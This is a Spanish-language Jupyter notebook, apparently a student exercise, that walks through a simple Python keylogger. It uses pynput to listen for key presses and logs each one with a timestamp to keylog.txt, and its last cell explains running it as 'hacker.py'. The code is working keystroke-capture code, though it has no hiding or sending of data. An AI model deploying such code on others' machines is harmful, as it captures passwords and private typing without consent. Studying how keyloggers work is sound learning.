{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6fe06980",
   "metadata": {},
   "source": [
    "# Para hacer la cuestion2 he deciddio hacer un keylogger\n",
    "\n",
    "### Lo primero que vamos a hacer va a ser importar tanto pynput que nos ayudará a leer las pulsaciones de teclas del usuario y logging que registrará las pulsaciones de teclas en un archivo que luego filtraremos\n",
    "\n",
    "### Para instalar pynput puedes utilizar en el prompt el siguiente código: conda install -c conda-forge pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2d04d82c",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "94ae9794",
   "metadata": {},
   "source": [
    "## Lo primero que haremos será poner el nombre del txt y después especificar el formato en el que se almacenarán las pulsaciones del teclado"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "863ac558",
   "metadata": {},
   "outputs": [],
   "source": [
    "logging.basicConfig(filename=(\"keylog.txt\"), level=logging.DEBUG, format=\" %(asctime)s - %(message)s\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ff960a69",
   "metadata": {},
   "source": [
    "## En la siguiente funcíón cada vez que el usuario toca una tecla la imprime en el txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4dddf1c6",
   "metadata": {},
   "outputs": [],
   "source": [
    "def on_press(key):\n",
    "    logging.info(str(key))"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "578e88d6",
   "metadata": {},
   "source": [
    "## Llamamos a un Listener y pasamos la función que registrará las pulsaciones. Luego con el join lo uniremos al hilo principal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5316437d",
   "metadata": {},
   "outputs": [],
   "source": [
    "with Listener(on_press=on_press) as listener :\n",
    "    listener.join()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "62e453db",
   "metadata": {},
   "source": [
    "#### Para poder ejecutarlo necesitaremos abrirlo por ejemplo en visual studio code en una clase terminada en .py por ejemplo hacker.py, una vez hecho esto solo tenemos que introducir  lo siguiente en la cmd: python3 hacker.py"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
